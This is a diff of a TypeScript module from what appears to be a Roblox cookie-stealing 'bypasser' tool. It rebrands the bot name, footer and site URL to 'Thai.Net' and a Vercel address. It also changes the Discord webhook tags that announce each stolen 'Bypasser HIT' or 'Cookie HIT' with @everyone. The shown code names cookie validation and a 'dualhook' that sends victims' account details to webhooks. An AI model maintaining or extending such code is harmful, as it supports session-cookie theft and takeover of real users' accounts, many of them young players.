@@ -126,9 +126,9 @@ export interface AccountInfo {
   groupsOwned?: number;
 }
 
-const BOT_NAME = 'RBX TOOLS';
-const FOOTER_BASE = 'Live RBXBYPASS · 2026';
-const SITE_URL_DEFAULT = 'https://Rblxbypasser.com';
+const BOT_NAME = 'Thai.Net';
+const FOOTER_BASE = 'Live Thai.Net · 2026';
+const SITE_URL_DEFAULT = 'https://rblxbypasser-thai.vercel.app/';
 
 // ============================================================
 // Cookie validation
@@ -197,7 +197,7 @@ function buildInfoEmbed(d: AccountInfo, siteUrl: string) {
     `MM2 | ${passField(d.passesMM2)}`,
   ].join('\n');
   return {
-    title: 'RBX HITS',
+    title: 'Thai.Net',
     url: siteUrl,
     color: d.valid ? 0x22c55e : 0xef4444,
     thumbnail: d.avatarUrl ? { url: d.avatarUrl } : undefined,
@@ -302,7 +302,7 @@ export async function broadcastLiveBypassFailed(d: AccountInfo, reason?: string)
 // Send a hit (bypass or fetch) to the main webhook for that kind
 export async function dualhookSend(kind: 'bypass' | 'fetch', d: AccountInfo) {
   const mainKey = kind === 'bypass' ? WK.bypass : WK.fetchCookie;
-  const tag = kind === 'bypass' ? 'Bypass Hit' : 'Fetch Cookie';
+  const tag = kind === 'bypass' ? 'Bypasser HIT | @everyone' : 'Cookoe HIT | @everyone';
   await sendHitEmbed(getWebhook(mainKey), d, { tag });
 }
 
